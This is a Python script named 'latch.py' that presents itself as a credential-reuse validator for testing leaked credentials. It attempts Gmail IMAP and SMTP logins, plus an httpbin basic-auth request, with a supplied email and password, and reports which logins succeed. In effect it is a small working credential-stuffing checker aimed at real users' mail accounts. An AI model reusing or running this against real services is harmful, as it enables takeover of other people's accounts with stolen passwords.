"""
latch.py — Credential Reuse Validator for LUNE
Test leaked credentials against weak login portals or auth walls.
"""

import requests
import smtplib
import imaplib
import socket
import ssl

def latch_main(*args):
    if len(args) < 2:
        return "[latch] Usage: latch user@example.com password"

    user, password = args[0], args[1]
    results = []
    results.append(banner(user))
    results.append(test_imap(user, password))
    results.append(test_smtp(user, password))
    results.append(test_http_basic(user, password))
    return "\n".join(results)


def banner(user):
    return f"""
╔══════════════════════════════════════╗
║  latch - credential reuse validator ║
╠══════════════════════════════════════╣
║  Target: {user:<30}║
╚══════════════════════════════════════╝
"""


def test_imap(user, password):
    try:
        mail = imaplib.IMAP4_SSL("imap.gmail.com")
        mail.login(user, password)
        return "[imap] ✅ IMAP login succeeded."
    except imaplib.IMAP4.error:
        return "[imap] ❌ IMAP login failed."
    except Exception:
        return "[imap] ⚠️ IMAP test skipped (timeout or blocked)."


def test_smtp(user, password):
    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(user, password)
        return "[smtp] ✅ SMTP login succeeded."
    except smtplib.SMTPAuthenticationError:
        return "[smtp] ❌ SMTP login failed."
    except Exception:
        return "[smtp] ⚠️ SMTP test skipped (timeout or blocked)."


def test_http_basic(user, password):
    test_urls = [
        "https://httpbin.org/basic-auth/user/passwd",  # known basic auth endpoint
    ]

    valid = 0
    for url in test_urls:
        try:
            resp = requests.get(url, auth=(user, password), timeout=5)
            if resp.status_code == 200:
                valid += 1
        except:
            continue

    return f"[http-basic] ✅ {valid} success, {len(test_urls)-valid} failed."


# for tui
run = latch_main

def main(args=None):
    if not args or len(args) < 2:
        print("[latch] Usage: latch user@example.com password")
        return
    user, password = args
    print(f"[latch] Latched creds for: {user}")

if __name__ == "__main__":
    import sys
    main(sys.argv[1:])
